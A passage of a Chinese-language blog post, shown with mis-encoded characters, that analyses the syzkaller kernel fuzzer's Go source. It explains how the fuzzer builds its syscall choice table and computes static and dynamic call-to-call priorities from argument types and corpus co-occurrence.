&#123;<br><span class="hljs-keyword">for</span> _, call := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">if</span> !enabled[call.Meta] &amp;&amp; !noGenerateCalls[call.Meta.ID] &#123;<br>fmt.Printf(<span class="hljs-string">&quot;corpus contains disabled syscall %v\n&quot;</span>, call.Meta.Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled syscall&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æœ€åè°ƒç”¨ <code>target.CalculatePriorities(corpus)</code> <strong>åŸºäºè¯­æ–™åº“è¿›è¡Œç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨çš„è®¡ç®—</strong></li><li>å®Œæˆåç”Ÿæˆä¸€ä¸ªæ–°çš„è¡¨ <code>run</code> ä½œä¸ºç»“æœä¸ç”Ÿæˆ&amp;ä¸ç”Ÿæˆç³»ç»Ÿè°ƒç”¨è¡¨ä¸€èµ·è¿”å›ï¼Œå…¶ä¸­å­˜å‚¨çš„æ˜¯å¯¹äºå¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨è€Œè¨€çš„<strong>åŠ æƒæƒé‡çš„ç´¯åŠ å’Œ</strong></li></ul><blockquote><p>ä¾‹å¦‚æœ‰ç»™å®šçš„ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ Aã€Bã€Cï¼Œæœ‰è¿™æ ·çš„ä¸€ä¸ªç”Ÿæˆä¼˜å…ˆçº§è¡¨ <code>prios</code>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨ <code>run</code> è¡¨ä¸­åˆ™ä¼šå°†ä¸€åˆ—çš„ç»“æœé€ä¸ªåŠ èµ·æ¥ï¼Œä»è€Œæœ‰è¿™æ ·çš„ä¸€ä¸ªç»“æœï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšç¬”è€…ä¹Ÿä¸çŸ¥é“ï¼š(</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := target.CalculatePriorities(corpus)<br>run := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-comment">// ChoiceTable.runs[][] åŒ…å«å¯¹åŠ æƒä¼˜å…ˆçº§æ•°å­—çš„ç´¯åŠ æ€»å’Œ.</span><br><span class="hljs-comment">// è¿™åœ¨ç”Ÿæˆç¨‹åºæ—¶æœ‰åŠ©äºå¸¦æƒå¿«é€ŸäºŒå‰æœç´¢.</span><br><span class="hljs-comment">// è¿™ä»…ç”¨äºåœ¨ç›®æ ‡ä¸Šæ‰€å¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> run &#123;<br><span class="hljs-keyword">if</span> !enabled[target.Syscalls[i]] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>run[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">var</span> sum <span class="hljs-type">int32</span><br><span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> run[i] &#123;<br><span class="hljs-keyword">if</span> enabled[target.Syscalls[j]] &#123;<br>sum += prios[i][j]<br>&#125;<br>run[i][j] = sum<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> &amp;ChoiceTable&#123;target, run, generatableCalls, noGenerateCalls&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ã€æ ¸å¿ƒã€‘target-CalculatePriorities-corpus-ï¼šè®¡ç®—-call-to-call-çš„æƒé‡è¡¨"><a href="#ã€æ ¸å¿ƒã€‘target-CalculatePriorities-corpus-ï¼šè®¡ç®—-call-to-call-çš„æƒé‡è¡¨" class="headerlink" title="ã€æ ¸å¿ƒã€‘target.CalculatePriorities(corpus)ï¼šè®¡ç®— call-to-call çš„æƒé‡è¡¨"></a>ã€æ ¸å¿ƒã€‘target.CalculatePriorities(corpus)ï¼šè®¡ç®— call-to-call çš„æƒé‡è¡¨</h3><p>å®šä¹‰äº <code>prog/prio.go</code> ä¸­çš„ <code>CalculatePriorities(corpus)</code> ä¸ºç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨çš„æ ¸å¿ƒè®¡ç®—è¿‡ç¨‹ï¼Œä»£ç å…¶å®æ¯”è¾ƒç®€å•ï¼ˆä¸è¿‡æ³¨é‡Šå¾ˆé•¿ï¼‰ï¼Œä¸»è¦åˆ†ä¸º<strong>é™æ€ä¼˜å…ˆçº§</strong>ä¸<strong>åŠ¨æ€ä¼˜å…ˆçº§</strong>ä¸¤éƒ¨åˆ†è¿›è¡Œè®¡ç®—ï¼Œé»˜è®¤è¿›è¡Œé™æ€ä¼˜å…ˆçº§çš„è®¡ç®—ï¼Œè‹¥è¯­æ–™åº“ä¸ä¸ºç©ºåˆ™å†è®¡ç®—åŠ¨æ€ä¼˜å…ˆçº§ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// è®¡ç®— call-to-call çš„ä¼˜å…ˆçº§.</span><br><span class="hljs-comment">// å¯¹äºä¸€å¯¹ç»™å®šçš„è°ƒç”¨ X ä¸ Y, ä¼˜å…ˆçº§ä¾¿æ˜¯æˆ‘ä»¬å¯¹äº</span><br><span class="hljs-comment">// å°†ä¸€ä¸ªé¢å¤–çš„è°ƒç”¨ Y æ·»åŠ åˆ°ä¸€ä¸ªåŒ…å«æœ‰è°ƒç”¨ X çš„ç¨‹åºå½“ä¸­</span><br><span class="hljs-comment">// æ˜¯å¦æœ‰å¯èƒ½ç»™å‡ºæ–°çš„è¦†ç›–ç‡çš„çŒœæµ‹.</span><br><span class="hljs-comment">// å½“å‰çš„ç®—æ³•æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šé™æ€ä¸åŠ¨æ€.</span><br><span class="hljs-comment">// é™æ€éƒ¨åˆ†åŸºäºå¯¹å‚æ•°ç±»å‹çš„åˆ†æ. ä¸¾ä¸ªğŸŒ°,</span><br><span class="hljs-comment">// è‹¥è°ƒç”¨ X ä¸ Y éƒ½æ¥å— fd[sock], åˆ™ä»–ä»¬æ›´æœ‰å¯èƒ½ä¸€èµ·ç»™å‡ºæ–°çš„è¦†ç›–ç‡.</span><br><span class="hljs-comment">// åŠ¨æ€éƒ¨åˆ†åˆ™åŸºäºè¯­æ–™åº“ä¸­ä¸€å¯¹ç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨åœ¨ä¸€ä¸ªç¨‹åºä¸­å‡ºç°çš„é¢‘ç‡.</span><br><span class="hljs-comment">// ä¾‹å¦‚ï¼Œè‹¥ socket ä¸ connect é¢‘ç¹åœ°åœ¨ä¸€ä¸ªç¨‹åºä¸­ä¸€èµ·å‡ºç°ï¼Œ</span><br><span class="hljs-comment">// æˆ‘ä»¬ç»™è¿™å¯¹ç³»ç»Ÿè°ƒç”¨æ›´é«˜çš„ä¼˜å…ˆçº§.</span><br><span class="hljs-comment">// æ³¨æ„: å½“å‰çš„å®ç°éå¸¸ç®€é™‹, ä»»ä½•å¸¸é‡èƒŒåéƒ½æ²¡æœ‰ç†è®ºæ”¯æŒ.</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> CalculatePriorities(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>static := target.calcStaticPriorities()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(corpus) != <span class="hljs-number">0</span> &#123;<br>dynamic := target.calcDynamicPrio(corpus)<br><span class="hljs-keyword">for</span> i, prios := <span class="hljs-keyword">range</span> dynamic &#123;<br>dst := static[i]<br><span class="hljs-keyword">for</span> j, p := <span class="hljs-keyword">range</span> prios &#123;<br>dst[j] = dst[j] * p / prioHigh<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> static<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºç»™å®šçš„ç³»ç»Ÿè°ƒç”¨ Xï¼Œæ·»åŠ ç³»ç»Ÿè°ƒç”¨ Y çš„ä¼˜å…ˆçº§ä¸ºï¼š<br>$$<br>æœ€ç»ˆä¼˜å…ˆçº§ &#x3D; é™æ€ä¼˜å…ˆçº§ * åŠ¨æ€ä¼˜å…ˆçº§ &#x2F; prioHigh<br>$$<br> å…¶ä¸­ <code>prioHigh</code> ä¸ºä¸€ä¸ªå¸¸é‡ <code>1000</code></p><h4 id="â‘ -calcStaticPriorities-ï¼šé™æ€ä¼˜å…ˆçº§è®¡ç®—"><a href="#â‘ -calcStaticPriorities-ï¼šé™æ€ä¼˜å…ˆçº§è®¡ç®—" class="headerlink" title="â‘  calcStaticPriorities()ï¼šé™æ€ä¼˜å…ˆçº§è®¡ç®—"></a>â‘  calcStaticPriorities()ï¼šé™æ€ä¼˜å…ˆçº§è®¡ç®—</h4><h5 id="Step-I-è®¡ç®—èµ„æºä½¿ç”¨æƒ…å†µ"><a href="#Step-I-è®¡ç®—èµ„æºä½¿ç”¨æƒ…å†µ" class="headerlink" title="Step.I - è®¡ç®—èµ„æºä½¿ç”¨æƒ…å†µ"></a>Step.I - è®¡ç®—èµ„æºä½¿ç”¨æƒ…å†µ</h5><blockquote><p>æ³¨ï¼šè¿™é‡Œçš„ã€èµ„æºã€‘æ›´ä¸¥è°¨åœ°è¯´åº”è¯¥æ˜¯ syzlang ä¸­çš„ <a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#VI-%E8%B5%84%E6%BA%90%EF%BC%88resources%EF%BC%89">resource</a></p></blockquote><p><code>calcStaticPriorities()</code> ç”¨ä»¥å®Œæˆé™æ€ä¼˜å…ˆçº§çš„è®¡ç®—ï¼Œè¯¥å‡½æ•°é¦–å…ˆä¼šè°ƒç”¨ <code>calcResourceUsage()</code> è·å–å½“å‰çš„ã€èµ„æºä½¿ç”¨æƒ…å†µã€‘ï¼š</p><ul><li>è¯¥å‡½æ•°çš„è¿”å›ç»“æœä¸ºä¸€ä¸ªäºŒé‡æ˜ å°„ <code>èµ„æºåï¼ˆstringï¼‰â†’ã€ç³»ç»Ÿè°ƒç”¨å·ï¼ˆintï¼‰â†’æƒé‡ï¼ˆweightsï¼‰ã€‘</code> </li><li>è¯¥å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ä¾¿æ˜¯è°ƒç”¨ <code>ForeachType()</code> è¿›è¡Œåˆ†æ</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcStaticPriorities() [][]<span class="hljs-type">int32</span> &#123;<br>uses := target.calcResourceUsage()<br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcResourceUsage() <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights &#123;<br>uses := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>ForeachType(target.Syscalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> uses<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¨åå†æ¥åˆ†æä¼ å…¥çš„é—­åŒ…å‡½æ•°ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ†æ <code>ForeachType()</code> ï¼Œå…¶ä¼šéå†ç³»ç»Ÿè°ƒç”¨è¡¨å¹¶è°ƒç”¨ <code>foreachTypeImpl()</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachTypePost</span><span class="hljs-params">(syscalls []*Syscall, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-keyword">for</span> _, meta := <span class="hljs-keyword">range</span> syscalls &#123;<br>foreachTypeImpl(meta, <span class="hljs-literal">false</span>, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>foreachTypeImpl()</code>  ç”¨ä»¥å¤„ç†å•ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…¶é¦–å…ˆä¼šåˆ›å»ºä¸€ä¸ª <code>ç±»å‹â†’bool</code> çš„æ˜ å°„ <code>seen</code>ï¼Œæ¥ä¸‹æ¥ä¼šåˆ›å»ºä¸€ä¸ªé—­åŒ…å‡½æ•° <code>rec</code> ï¼Œè¯¥å‡½æ•°ä¼šæ ¹æ®ä¼ å…¥ç±»å‹çš„ä¸åŒè¿›è¡Œä¸åŒæ“ä½œï¼š</p><blockquote><p>æ³¨ï¼šè¿™é‡Œçš„ç±»å‹åº”å½“ä¸º syzlang ä¸­çš„ç±»å‹</p></blockquote><ul><li>è‹¥æ˜¯æŒ‡é’ˆç±»å‹ ï¼ˆ<code>PtrType</code> ï¼‰ï¼Œåˆ™é€’å½’è°ƒç”¨  <code>rec</code> </li><li>è‹¥æ˜¯æ•°ç»„ç±»å‹ï¼ˆ<code>ArrayType</code> ï¼‰ï¼Œåˆ™é€’å½’è°ƒç”¨ <code>rec</code></li><li>è‹¥æ˜¯ç»“æ„ä½“ç±»å‹ï¼ˆ<code>StructType</code>ï¼‰ä¸”ä¸åœ¨ <code>seen</code> ä¸­ï¼Œå°†å…¶æ·»åŠ åˆ° <code>seen</code> ä¸­ï¼Œå¹¶ä¸ºæ¯ä¸€ä¸ªç»“æ„ä½“æˆå‘˜è°ƒç”¨ <code>rec</code> </li><li>è‹¥æ˜¯è”åˆç±»å‹ï¼ˆ<code>UnionType</code>ï¼‰ä¸”ä¸åœ¨ <code>seen</code> ä¸­ï¼Œå°†å…¶æ·»åŠ åˆ° <code>seen</code> ä¸­ï¼Œå¹¶ä¸ºæ¯ä¸€ä¸ªè”åˆæˆå‘˜è°ƒç”¨ <code>rec</code> </li><li>å…¶ä»–åˆæ³•ç±»å‹åˆ™ç›´æ¥è·³è¿‡ï¼Œéæ³•ç±»å‹ï¼ˆsyzlang ç¼–è¯‘æœŸé”™è¯¯ï¼‰åˆ™ panic</li><li>æœ€åè°ƒç”¨ä¸Šå±‚ä¼ å…¥çš„é—­åŒ…å‡½æ•°ï¼ˆæˆ‘ä»¬åœ¨ <code>ForeachTypePost()</code> ä¸­ä¼ å…¥ <code>preorder = false</code>ï¼‰</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachTypeImpl</span><span class="hljs-params">(meta *Syscall, preorder <span class="hljs-type">bool</span>, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-comment">// æ³¨æ„: æˆ‘ä»¬ç‰¹æ„ä¸åœ¨ ForeachType ä¸­åˆ›å»º seen..</span><br><span class="hljs-comment">// å…¶èƒ½æ›´å¥½åœ°å¯¹é€’å½’è¿›è¡Œå‰ªæ (åœ¨ç³»ç»Ÿè°ƒç”¨é—´), ä½†å¤§é‡çš„ä½¿ç”¨è€…éœ€è¦</span><br><span class="hljs-comment">// å¯¹å•ä¸ªç³»ç»Ÿè°ƒç”¨è®¿é—®æ¯ä¸ªç»“æ„ä½“ (ä¾‹å¦‚ prio, used resources).</span><br>seen := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[Type]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> rec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Type, Dir)</span></span><br>rec = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ptr *Type, dir Dir)</span></span> &#123;<br>ctx := &amp;TypeCtx&#123;Meta: meta, Dir: dir, Ptr: ptr&#125;<br><span class="hljs-keyword">if</span> preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> a := (*ptr).(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *PtrType:<br>rec(&amp;a.Elem, a.ElemDir)<br><span class="hljs-keyword">case</span> *ArrayType:<br>rec(&amp;a.Elem, dir)<br><span class="hljs-keyword">case</span> *StructType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// é€šè¿‡å¯¹structs/unionsçš„æŒ‡é’ˆæ¥å‰ªææ‰é€’å½’</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *UnionType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// é€šè¿‡å¯¹structs/unionsçš„æŒ‡é’ˆæ¥å‰ªææ‰é€’å½’</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *ResourceType, *BufferType, *VmaType, *LenType, *FlagsType,<br>*ConstType, *IntType, *ProcType, *CsumType:<br><span class="hljs-keyword">case</span> Ref:<br><span class="hljs-comment">// ä»… pkg/compiler éœ€è¦.</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown type&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> !preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;Stop is set in post-order iteration&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>foreachTypeImpl()</code> å®é™…ä¸Šä¾¿æ˜¯ä¸ºä¼ å…¥çš„ç³»ç»Ÿè°ƒç”¨çš„æ¯ä¸ªå‚æ•°éƒ½è°ƒç”¨ <code>rec()</code>ï¼Œè‹¥å­˜åœ¨è¿”å›å€¼ä¹Ÿä¸ºå…¶è°ƒç”¨ <code>rec</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> meta.Args &#123;<br>rec(&amp;meta.Args[i].Type, DirIn)<br>&#125;<br><span class="hljs-keyword">if</span> meta.Ret != <span class="hljs-literal">nil</span> &#123;<br>rec(&amp;meta.Ret, DirOut)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å›åˆ° <code>calcResourceUsage()</code> çœ‹å…¶ä¼ ç»™ <code>ForeachType()</code> çš„é—­åŒ…å‡½æ•°ï¼Œä¹Ÿæ˜¯æ ¹æ®ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°çš„ç±»å‹ä¸åŒè¿›è¡Œå¤„ç†ï¼š</p><blockquote><p>è¿™é‡Œçš„ <code>a</code> ä¸º Type æ¥å£ï¼Œ a.Desc ä¸º ResourceDescç±»å‹ï¼Œå³å¯¹ä¸€ä¸ªèµ„æºçš„æè¿°ï¼Œå…¶ Kind åŸŸä¸ºä¸€ä¸ª string æ•°ç»„ï¼ŒValues åŸŸä¸ºä¸€ä¸ª uint64 æ•°ç»„</p></blockquote><ul><li><p>è‹¥æ˜¯èµ„æºç±»å‹ ï¼ˆ<code>ResourceType</code> ï¼‰ï¼š</p><ul><li>è‹¥åœ¨ <code>AuxResources</code> è¡¨ï¼ˆè¾…åŠ©èµ„æºè¡¨ï¼Œå³æ‰®æ¼”ç€è¾…åŠ©è§’è‰²ä½†æ˜¯åœ¨æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ä¸­éƒ½ä¼šç”¨åˆ°çš„èµ„æºï¼ˆä¾‹å¦‚uid&#x2F;gidï¼‰ï¼‰é‡Œå·²æœ‰è®°å½•ï¼Œåˆ™è°ƒç”¨ <code>noteUsage()</code> æ›´æ–°æƒé‡å€¼ï¼Œè¿™é‡Œç»™çš„æƒé‡å€¼ä¸º 1</li><li>å¦åˆ™ï¼Œéå† <code>a.Desc.Kind</code> ï¼Œè°ƒç”¨ <code>noteUsage()</code> æ›´æ–°æƒé‡å€¼ï¼Œè¿™é‡Œç»™é™¤äº†æœ€åä¸€ä¸ª Kind ä»¥å¤–çš„æƒé‡å€¼ä¸º 2ï¼Œæœ€åä¸€ä¸ªä¸º 10</li></ul></li><li><p>è‹¥æ˜¯æŒ‡é’ˆç±»å‹ï¼ˆ<code>PttrType</code>ï¼‰ï¼Œåˆ™åˆ¤æ–­æŒ‡é’ˆæ‰€æŒ‡å¯¹è±¡ç±»å‹ï¼ˆç»“æ„ä½“&#x2F;è”åˆä½“&#x2F;æ•°ç»„ï¼‰å¹¶è°ƒç”¨ <code>noteUsage()</code> æ›´æ–°æƒé‡å€¼ï¼Œè¿™é‡Œç»™çš„æƒé‡å€¼éƒ½ä¸º 10</p></li><li><p>è‹¥æ˜¯ buffer ç±»å‹ï¼ˆ<code>BufferType</code>ï¼‰ï¼Œåˆ™æ ¹æ® <code>a.Kind</code> è¿›è¡Œä¸åŒå¤„ç†ï¼š</p><ul><li><code>BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed</code> ï¼šæ— å¤„ç†</li><li><code>BufferString, BufferGlob</code> ï¼šè‹¥ <code>a.SubKind != &quot;&quot;</code>ï¼Œåˆ™è°ƒç”¨ <code>noteUsage()</code> æ›´æ–°æƒé‡å€¼ï¼Œè¿™é‡Œç»™çš„æƒé‡å€¼ä¸º 2</li><li><code>BufferFilename</code>ï¼šè°ƒç”¨ <code>noteUsage()</code> æ›´æ–°æƒé‡å€¼ï¼Œè¿™é‡Œç»™çš„æƒé‡å€¼ä¸º 10</li></ul></li><li><p>è‹¥ä¸º VMA ç±»å‹ ï¼ˆ<code>VmaType</code>ï¼‰ï¼Œåˆ™è°ƒç”¨ <code>noteUsage()</code> æ›´æ–°æƒé‡å€¼ï¼Œè¿™é‡Œç»™çš„æƒé‡å€¼ä¸º 5</p></li><li><p>å¯¹äºæ•´å‹åˆ™æ£€æŸ¥ <code>a.Kind</code> æ˜¯å¦ä¸º <code>IntPlain, IntRange</code>ï¼Œè‹¥ä¸æ˜¯åˆ™ç›´æ¥ panic</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br>c := ctx.Meta<br><span class="hljs-keyword">switch</span> a := t.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ResourceType:<br><span class="hljs-keyword">if</span> target.AuxResources[a.Desc.Name] &#123;<br>noteUsage(uses, c, <span class="hljs-number">1</span>, ctx.Dir, <span class="hljs-string">&quot;res%v&quot;</span>, a.Desc.Name)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>str := <span class="hljs-string">&quot;res&quot;</span><br><span class="hljs-keyword">for</span> i, k := <span class="hljs-keyword">range</span> a.Desc.Kind &#123;<br>str += <span class="hljs-string">&quot;-&quot;</span> + k<br>w := <span class="hljs-type">int32</span>(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-built_in">len</span>(a.Desc.Kind)<span class="hljs-number">-1</span> &#123;<br>w = <span class="hljs-number">2</span><br>&#125;<br>noteUsage(uses, c, w, ctx.Dir, str)<br>&#125;<br>&#125;<br><span class="hljs-keyword">case</span> *PtrType:<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*StructType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*UnionType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> arr, ok 